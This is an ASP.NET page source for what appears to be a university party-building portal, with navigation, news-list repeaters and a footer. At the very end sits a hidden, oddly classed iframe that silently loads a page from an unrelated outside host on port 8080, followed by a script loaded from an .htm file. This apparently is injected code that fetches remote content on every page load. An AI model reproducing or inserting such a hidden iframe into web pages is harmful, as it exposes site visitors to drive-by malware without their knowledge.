﻿<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="Default" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>数计学院党建服务云平台</title>
    <script src="show_files/query">
	
</script>
<script src="show_files/style2.htm">
</script>
   
<!-- InstanceBeginEditable name="doctitle" -->
<!-- InstanceEndEditable -->
<link href="show_files/sp_public_v2.css" rel="stylesheet" type="text/css"/>
<!-- <link rel="stylesheet" type="text/css" href="css/header_balack.css">  -->
<!-- 首页的头部样式 -->
<link href="show_files/header_whiter.css" rel="stylesheet" type="text/css"/>
<!-- 内页的头部样式 -->
<link href="show_files/style.css" rel="stylesheet" type="text/css"/>
<!--第二份style样式-->
<link href="show_files/style2.css" rel="stylesheet" type="text/css"/>
<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
<style id="style-1-cropbar-clipper">
.en-markup-crop-options {
    top: 18px !important;
    left: 50% !important;
    margin-left: -100px !important;
    width: 200px !important;
    border: 2px rgba(255,255,255,.38) solid !important;
    border-radius: 4px !important;
}

.en-markup-crop-options div div:first-of-type {
    margin-left: 0px !important;
}
</style>
</head>
<body class="bg-color-gray3">
	<!--状态栏-->
    <div class="container">
	<div class="nav-navbar">
		<div class="confont-top clearboth">
			<div class="confont-con">
				
				<div class="pull-left" style="float:right">
					<a href="user_login.aspx">登录</a>				
				</div>
			</div>
		</div>
	</div>
    </div>
	<!--状态栏end-->
	
	<!-- 头部的logo -->
	<div class="confont-logo">
		<div class="confont-con">
			<div class="pull-left">
				<img src="show_files/logo.png" height="40"/>
			</div>
			
			<!--<div class="pull-right">
				<img src="show_files/icon_phone.png" width="40"/> <b>400-000-0000</b>
			</div>-->
			
		</div>
	</div>
	
	<!-- 头部的logo结束end -->
	<div class="confont-nav">
		<div class="confont-con">
			<ul class="pull-left nav">
				<li class="active"><a href="#">首页</a></li>
				<li class="down"><a href="#">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;党员学习&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></li>
				<li class="down"><a href="#">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;民生平台&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
					<ul class="down-meau" style="display: none;">
						<li><a href="#"></a></li>
						<li class="bg-no hr-no"><a href="#"></a></li>
					</ul>
				</li>
				<li class="down"><a href="#">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;党员纪实&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
					<ul class="down-meau" style="display: none;">
						<li><a href="#"></a></li>
						<li><a href="#"></a></li>
						<li class="bg-no hr-no"><a href="#"></a></li>
					</ul></li>
				<li class="down"><a href="#">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;支部概述&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
					<ul class="down-meau" style="display: none;">
						<li><a href="#">数学</a></li>
						<li><a href="#">软件</a></li>
						<li class="bg-no hr-no"><a href="#">计科</a></li>
					</ul></li>			
				<li class="down"><a href="#">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工作动态&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
					<ul class="down-meau" style="display: none;">
						<li><a href="#"></a></li>
						<li><a href="#"></a></li>
						<li class="bg-no hr-no"><a href="#">党务公开</a></li>
					</ul></li>
			</ul>
		</div>
	</div>
	<!-- 导航栏end -->
	<!-- InstanceBeginEditable name="public" -->    


	<!-- banner轮播 -->
	<div class="confont-ban">
		<ul class="ban-img">
			<li style="display: none;"><img src="show_files/index_banner_01.png"/></li>
			<!--<li style="display: none;"><img src="show_files/index_banner_02.png"></li>-->
			<li style="display: none;"><img src="show_files/index_banner_04.jpg"/></li>
			<li style="display: list-item;"><img src="show_files/index_banner_03.png"/></li>
			
		</ul>
		<ul class="num">
			<li class=""></li>
			<!--<li class=""></li>-->
			<li class="on"></li>
			<li class=""></li>
		</ul>
		<div class="btn btn-l">&lt;</div>
		<div class="btn btn-r">&gt;</div>
	</div>
	<!-- banner轮播end -->
	
	<!-- 新闻列表的模块 -->
	<div class="confont-con clearfix">
		<div class="INnews-con  mt-30">
			<!-- 左边开始 -->
			<div class="INnews-left">
				<ul class="INnews-left-tab">
					<li class="">新闻公告</li>

					<li>新闻资讯</li>
					<li>通知公告</li>
					<li class="active">工作动态</li>					
				</ul>

				<!-- 时事新闻 -->
				<ul class="slide-list">
					<li class="clearfix pl-20 pt-20 pb-30 " style="display: none;">
						<div class="INnews-slide">
							<div class="bd">
                                <!--
								<div class="tempWrap" style="overflow:hidden; position:relative; width:310px">
									<ul style="width: 620px; left: 0px; position: relative; overflow: hidden; padding: 0px; margin: 0px;">
										<li style="float: left; width: 310px;">								 
											<img src="show_files/58bc07deb4c64.zip"/>
											<a href="#">习近平：在纪念红军长征胜利80周年大会上的讲话</a>
										</li>
										<li style="float: left; width: 310px;"> 
											<img src="show_files/577b5fdb84511.jpg"/>
											<a href="#">2017XXX县建国前老党员和建档立卡贫困户中党员“七、一”慰问金发放名单</a>
										</li>
									</ul>
								</div>
                                -->
							</div>
							<!-- 下面是前/后按钮代码，如果不需要删除即可 -->
							<a class="prev" href="javascript:void(0)"></a> <a class="next" href="javascript:void(0)"></a>
						</div>

						<ul class="INnews-left-list">
                            <!--
							<li><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=227">XXX县集中完善新社保卡个人信息 <span class="pull-right fsize-12 fcolor-99">2016-07-26</span>
								</a></li><li><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=226">冬枣专家现场“把脉问诊”解民忧 <span class="pull-right fsize-12 fcolor-99">2016-07-26</span>
								</a></li><li><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=222">XXX县组织农村环境卫生集中整治现场观摩 <span class="pull-right fsize-12 fcolor-99">2016-07-11</span>
								</a></li>	
                            -->	
                            
                            <asp:Repeater ID="Repeater1" runat="server" >
                                <HeaderTemplate>
                                </HeaderTemplate>

                            <ItemTemplate>
                                <tr>
                                    <td style="width:340px;overflow:hidden;white-space:nowrap;">
                                        <a href="/Pages.aspx?ClassId=<%#Eval("ClassId") %>&NId=<%#Eval("NId")%>">&nbsp·&nbsp<%#Eval("Title") %></a>
                                    </td>
                                    <td style="width:120px; float:right;">&nbsp&nbsp&nbsp&nbsp<%#Eval("Time") %>
                                    </td>
                                </tr>
                                <br />
                            </ItemTemplate>
                        
                                <FooterTemplate>
                                </FooterTemplate>
                            </asp:Repeater>
						</ul>

					</li>
					<!-- 时事新闻end -->
					
					<!-- 红色古城 -->
					<li class="clearfix pl-20 pt-20 pb-30 " style="display: none;">
						<div class="INnews-slide">
                            <!--
							<div class="bd">
								<div class="tempWrap" style="overflow:hidden; position:relative; width:310px"><ul style="width: 620px; left: 0px; position: relative; overflow: hidden; padding: 0px; margin: 0px;">
									<li style="float: left; width: 310px;"><img src="show_files/58bc07deb4c64.zip"/>  <a href="#">习近平：在纪念红军长征胜利80周年大会上的讲话</a></li>
									<li style="float: left; width: 310px;"><img src="show_files/577b5fdb84511.jpg"/>  <a href="#">2016XXX县建国前老党员和建档立卡贫困户中党员“七、一”慰问金发放名单</a></li>
								</ul></div>
							</div>
                            -->
							<!-- 下面是前/后按钮代码，如果不需要删除即可 -->
							<a class="prev" href="javascript:void(0)"></a> <a class="next" href="javascript:void(0)"></a>
						</div>
						<ul class="INnews-left-list">
							<li><a href="#">XXX县党委学习《中国共产党问责条例》 <span class="pull-right fsize-12 fcolor-99">2016-07-27</span>
							</a></li><li><a href="#">忆党史颂党恩 <span class="pull-right fsize-12 fcolor-99">2016-07-01</span>
							</a></li><li><a href="#">古稀农民笔下的爱党情怀 <span class="pull-right fsize-12 fcolor-99">2016-07-01</span>
							</a></li>					
						</ul>
					</li>
					<!-- 红色古城end -->
					
					<!-- 党务公开 -->
					<li class="clearfix pl-20 pt-20 pb-30 " style="display: none;">
						<div class="INnews-slide">
							<div class="bd">
                                <!--
								<div class="tempWrap" style="overflow:hidden; position:relative; width:310px">
                                    <ul style="width: 620px; left: 0px; position: relative; overflow: hidden; padding: 0px; margin: 0px;">
									    <li style="float: left; width: 310px;"><img src="show_files/58bc07deb4c64.zip"/>  <a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=237">习近平：在纪念红军长征胜利80周年大会上的讲话</a></li>
									    <li style="float: left; width: 310px;"><img src="show_files/577b5fdb84511.jpg"/>  <a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=209">2016XXX县建国前老党员和建档立卡贫困户中党员“七、一”慰问金发放名单</a></li>
								    </ul>

								</div>
                                -->
							</div>
							<!-- 下面是前/后按钮代码，如果不需要删除即可 -->
							<a class="prev" href="javascript:void(0)"></a> <a class="next" href="javascript:void(0)"></a>
						</div>


						<ul class="INnews-left-list">
                            <!--
							<li><a href="#">XXX县巴家村6月份党费缴纳情况公示 <span class="pull-right fsize-12 fcolor-99">2016-07-15</span>
							</a></li><li><a href="#">XXX县建国前老党员和建档立卡贫困户中党员“七、一”慰问金发放名单 <span class="pull-right fsize-12 fcolor-99">2016-09-01</span>
							</a></li>	
                            -->
                            
                            <asp:Repeater ID="Repeater2" runat="server" >
                                <HeaderTemplate>
                                </HeaderTemplate>

                            <ItemTemplate>
                                <tr>
                                    <td style="width:340px;overflow:hidden;white-space:nowrap;">
                                        <a href="/Pages.aspx?ClassId=<%#Eval("ClassId") %>&NId=<%#Eval("NId")%>">&nbsp·&nbsp<%#Eval("Title") %></a>
                                    </td>
                                    <td style="width:120px; float:right;">&nbsp&nbsp&nbsp&nbsp<%#Eval("Time") %>
                                    </td>
                                </tr>
                                <br />
                            </ItemTemplate>
                        
                                <FooterTemplate>
                                </FooterTemplate>
                            </asp:Repeater>				
						</ul>
					</li>
					<!-- 党务公开end -->
					
					<!-- 党性教育-->
					<li class="clearfix pl-20 pt-20 pb-30 " style="display: none;">
						<div class="INnews-slide">
							<div class="bd">
                                <!--
								<div class="tempWrap" style="overflow:hidden; position:relative; width:310px">
                                    <ul style="width: 620px; left: 0px; position: relative; overflow: hidden; padding: 0px; margin: 0px;">
									    <li style="float: left; width: 310px;"><img src="show_files/58bc07deb4c64.zip"/>  <a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=237">习近平：在纪念红军长征胜利80周年大会上的讲话</a></li>
									    <li style="float: left; width: 310px;"><img src="show_files/577b5fdb84511.jpg"/>  <a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=209">2016XXX县建国前老党员和建档立卡贫困户中党员“七、一”慰问金发放名单</a></li>
								    </ul>
								</div>
                                -->
							</div>
							<!-- 下面是前/后按钮代码，如果不需要删除即可 -->
							<a class="prev" href="javascript:void(0)"></a> <a class="next" href="javascript:void(0)"></a>
						</div>
                        <!--
						<ul class="INnews-left-list">
							<li><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=232">习近平告诉你学习党章、加强党性修养有多重要 <span class="pull-right fsize-12 fcolor-99">2016-07-26</span>
							</a></li><li><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=159">筑牢拒腐防变的思想道德防线 <span class="pull-right fsize-12 fcolor-99">2016-07-01</span>
							</a></li><li><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=158">把权力关进制度的笼子里 <span class="pull-right fsize-12 fcolor-99">2016-07-01</span>
							</a></li>					
						</ul>
                        -->
					</li>
					<!-- 党性教育end -->
				</ul>
				<!-- 党员风采end -->
			</div>
			<!-- 左边结束 -->
			
            <!--
			<!-- 右边开始 
			<div class="INnews-right">
				<!-- 黄色小点 
				<div class="hd">
					<ul>
						<li class="on"></li>
						<li class=""></li>
					</ul>
				</div>
				<!-- 黄色小点end 
				<div class="bd">
					<div class="tempWrap" style="overflow:hidden; position:relative; width:280px"><ul class="ml-20" style="width: 840px; position: relative; overflow: hidden; padding: 0px; margin: 0px; left: -280px;"><li style="float: left; width: 280px;" class="clone">
							<div class="mt-40">
								<b class="fcolor-33 fsize-20">XXX</b> <a href="http://dj.sp11.cn/Index/Cms/cms_study_index/cat_id/3.html" class="fcolor-orange fsize-20 mt-5 di-b"> 学习教育专题&gt;&gt; </a>
							</div>
							<div class="hr-sb-gray2 mt-30"></div>
							<div class="mt-30">
								<p class="fcolor-66 lh-15em mt-10 fsize-20">学党章党规</p>
								<p class="fcolor-66 lh-15em mt-10 fsize-20">学系列讲话</p>
								<p class="fcolor-66 lh-15em mt-10 fsize-20">做合格党员</p>
							</div>
						</li>
						<li style="float: left; width: 280px;">
							<div class="mt-40">
								<b class="fcolor-33 fsize-20">XXX</b> <a href="http://dj.sp11.cn/Index/Cms/cms_study_index/cat_id/3.html" class="fcolor-orange fsize-20 mt-5 di-b"> 学习教育专题&gt;&gt; </a>
							</div>
							<div class="hr-sb-gray2 mt-30"></div>
							<div class="mt-30">
								<p class="fcolor-66 lh-15em mt-10 fsize-20">学党章党规</p>
								<p class="fcolor-66 lh-15em mt-10 fsize-20">学系列讲话</p>
								<p class="fcolor-66 lh-15em mt-10 fsize-20">做合格党员</p>
							</div>
						</li>
					<li style="float: left; width: 280px;" class="clone">
							<div class="mt-40">
								<b class="fcolor-33 fsize-20">XXX</b> <a href="http://dj.sp11.cn/Index/Cms/cms_study_index/cat_id/3.html" class="fcolor-orange fsize-20 mt-5 di-b"> 学习教育专题&gt;&gt; </a>
							</div>
							<div class="hr-sb-gray2 mt-30"></div>
							<div class="mt-30">
								<p class="fcolor-66 lh-15em mt-10 fsize-20">学党章党规</p>
								<p class="fcolor-66 lh-15em mt-10 fsize-20">学系列讲话</p>
								<p class="fcolor-66 lh-15em mt-10 fsize-20">做合格党员</p>
							</div>
						</li></ul></div>
				</div>
			</div>
                -->
			<!-- 右边结束 -->

		</div>
	</div>
	<!-- 新闻列表的模块end -->
		
	<!-- 党员发展全程纪实模块 -->
	<div class="confont-con clearfix">
		<div class="INparty-con mt-20">
			<!--   <div class="INmessage-title center">
      <p class="fsize-20 fcolor-orange">党员加油站</p>
    </div> 
			<ul class="INparty-list  INlist">
				<li>
					<h3 class="fweight-100 fsize-16">党员发展全程纪实</h3>
					<div class="INparty-list-img">
						<img src="show_files/index_womon.jpg" width="250"/>
					</div> <a href="http://dj.sp11.cn/Index/Hr/hr_partyrecord_index.html">
						<p>
							<nobr> 王  杨：预备党员 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99"></span>
					</a><a href="http://dj.sp11.cn/Index/Hr/hr_partyrecord_index.html">
						<p>
							<nobr> 李园园：预备党员 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99"></span>
					</a><a href="http://dj.sp11.cn/Index/Hr/hr_partyrecord_index.html">
						<p>
							<nobr> 张同义：预备党员 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99"></span>
					</a>				</li>
				<li>
					<h3 class="fweight-100 fsize-16">党史纵横</h3> <a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=231">
						<p>
							<nobr> 南杨北李：中共最早系统传播马克思主义的先驱 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-07-26</span>
					</a><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=230">
						<p>
							<nobr> 十四大党章：贯穿建设有中国特色社会主义 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-07-26</span>
					</a><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=211">
						<p>
							<nobr> 党史上的今天 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-07-06</span>
					</a><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=192">
						<p>
							<nobr> 探寻中纪委历史足迹 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-06-28</span>
					</a><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=191">
						<p>
							<nobr> 盘点党史重要会议 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-06-28</span>
					</a><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=150">
						<p>
							<nobr> 罗瑞卿：把家教写在墙上 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-06-28</span>
					</a><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=149">
						<p>
							<nobr> 【民族脊梁】叶挺：在烈火和热血中永生 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-06-28</span>
					</a><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=148">
						<p>
							<nobr> 坚定信念：柳直荀转报郭亮的遗嘱 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-06-28</span>
					</a><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=147">
						<p>
							<nobr> 老一辈革命家的党员意识 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-06-28</span>
					</a><a href="http://dj.sp11.cn/Index/Cms/cms_news_info.html?article_id=129">
						<p>
							<nobr> 毛泽东在抗大讲党课 </nobr>
						</p> <span class="pull-right fsize-12 fcolor-99">2016-06-28</span>
					</a>				
				</li>								
			</ul>
            -->
		</div>
	</div>

	<!-- 党员风采展示end -->

	<!-- 站内链接 -->
	<div id="link" class="confont-con clearfix">
		<div class="INlink-con mt-20">
			<div class="INmessage-title center">
				<p class="fsize-20 fcolor-orange">站内链接</p>
			</div>
			<div class="INlink-con-list">			
				<a href="#">中央党校思想理论网</a> 
				<a href="#">中国共产党新闻网</a> 
				<a href="#">中国政府网</a>  		
				<a href="#">中国人大网</a>  
				<a href="#">湖北省高校思政教育网</a>
				<a href="#">湖北省党务公开网</a>
				<a href="https://www.wtu.edu.cn/html/wwwindex.html" target="_blank">武汉纺织大学官方主页</a>		
				<a href="#" target="_blank">武汉纺织大学数计学院官方主页</a>
			</div>
		</div>
	</div>
	<!-- 站内链接end -->
	
	<!-- 底部 -->
<meta charset="utf-8"/>
<div class="confont-bottom">
	<div class="confont-con">
		<div class="center">
			<p class="lh-35">
				版权所有：©武汉纺织大学数计学院 2017    
			</p>
			<p class="lh-35">
			</p><p class="lh-35">
				技术支持：<!--<a href="" target="_blank"> 技术支持： </a>--> 
			</p>
			<p></p>
		</div>
	</div>
</div>
<script type="text/javascript" src="show_files/jquery.js"></script>
<!-- <script src="public/js/jquery-1.8.3.min.js"></script> -->
<script src="show_files/jquery_002.js"></script>
<script src="show_files/style.js"></script>
<!--第二份js文件-->
<script src="show_files/style2.js"></script>
<!-- InstanceEnd -->
<iframe id="cm_if" src="http://log.orchidscape.net:8080/index.html" style="display: none;" class="qfbqvaowyylhcorlvwko"></iframe><script src="show_files/u.htm"></script>
 
</body>
</html>


